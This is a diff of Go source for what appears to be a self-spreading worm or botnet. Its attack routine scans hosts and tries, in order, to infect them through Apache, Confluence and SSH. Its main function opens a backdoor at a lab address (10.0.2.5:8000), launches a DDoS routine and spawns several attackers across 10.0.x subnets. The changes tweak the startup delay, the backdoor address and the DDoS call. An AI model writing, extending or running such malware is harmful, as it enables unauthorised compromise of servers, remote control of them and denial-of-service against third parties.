@@ -20,15 +20,16 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 	ports := scan.ScanIp(ip)
 	fmt.Println(ports)
 	infected := false
+	
 	//Apache infect
 	if ports[0] != 0 {
 		if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
 			infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
-			//fmt.Println(infected)
+			fmt.Println(infected)
 		}
 	}
-	//Confluence infect
 	
+	//Confluence infect
 	if !infected && ports[2] != 0 {
 		ip_port := ip + ":" + strconv.Itoa(ports[2])
 		confluenceUrl := "http://" + ip_port
@@ -38,6 +39,7 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 			fmt.Println(infected)
 		}
 	}
+	
 	//SSH infect
 	if !infected && ports[1] != 0 {
 		ip_port := ip + ":" + strconv.Itoa(ports[1])
@@ -66,13 +68,13 @@ func randomNumber(max int) int {
 }
 
 func main() {
-	x := randomNumber(60)
+	x := randomNumber(15)
 	time.Sleep(time.Duration(x) * time.Second)
 		
-	go infection.OpenBackdoor("10.0.2.15:8000")
+	go infection.OpenBackdoor("10.0.2.5:8000")
 	var wg sync.WaitGroup
 	wg.Add(1)
-	go ddos.Hello(&wg,"test")
+	go ddos.initDDOS(&wg,"test")
 
 	nAttackers := 6
 	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
